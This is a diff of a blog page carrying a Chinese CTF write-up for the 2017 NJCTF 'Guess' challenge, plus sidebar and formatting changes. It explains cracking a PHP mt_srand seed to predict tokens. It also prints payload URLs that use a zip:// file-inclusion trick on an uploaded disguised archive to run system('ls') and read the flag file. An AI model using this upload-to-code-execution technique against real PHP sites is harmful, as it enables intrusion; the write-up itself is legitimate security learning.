@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -418,12 +418,13 @@ height:50vh;
 </blockquote>
 <p>由此可知，重点是预测 random_str() 的值。</p>
 <p>联想到此前的 2018 SWPUCTF 用优惠码买个X？<a href="https://www.anquanke.com/post/id/168308" target="_blank" rel="noopener">SWPUCTF wp</a></p>
-<p>因此我们只要得到 mt_srand() 函数的播种种子的值，就可以预测出24位的优惠码。</p>
+<p>因此我们只要得到 <code>mt_srand()</code> 函数的播种种子的值，就可以预测出24位的优惠码。</p>
 <blockquote>
-<p>测试发现无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题.</p>
+<p>测试发现无论是 rand() 函数还是 mt_rand() 函数，当随机数种子相同的时候，无论运行多少次，产生的随机数序列都是一样的。所以，如果我们在代码中自己播种的随机数种子泄露，就会导致产生的随机数序列被别人猜到，造成安全问题。</p>
 </blockquote>
 <p>对于这个题也类似，只要得到种子，就能预测。</p>
-<p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a> <a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">大牛的爆破种子神器</a></p>
+<p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a> </p>
+<p><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">大牛的爆破种子神器</a></p>
 <p>直接强行爆破太麻烦了，先爆出一个随机数，利用这个随机数去爆破它的种子。</p>
 <p>将 test.php 文件打个压缩包 test.zip，然后改后缀名 test.png，利用 zip:// 解压缩读取</p>
 <p><a href="http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()</a>;</p>
@@ -440,7 +441,7 @@ height:50vh;
 <p>最后的 payload 如下：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> test.png%23test&amp;a=echo%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure>
 <p>然后 cat flag</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -448,7 +449,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/">https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/">December 30th 2018, 12:54:58 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/">March 20th 2019, 12:51:40 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2018/12/30/2017_NJCTF_Guess/">April 9th 2019, 3:26:46 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -913,14 +914,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 25
@@ -944,6 +937,11 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2018-RCTF/">2018_RCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2019-TCTF-Writeup/">2019_TCTF_Writeup</a>
         </li>
     
@@ -955,11 +953,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/Hackme-Writeup/">Hackme_Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2018-RCTF/">2018_RCTF</a>
         </li>
     
     
@@ -984,12 +977,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯_一月-web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019_Fireshell_Web_Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019_Fireshell_Web_Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯_一月-web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -1080,15 +1073,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
-        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
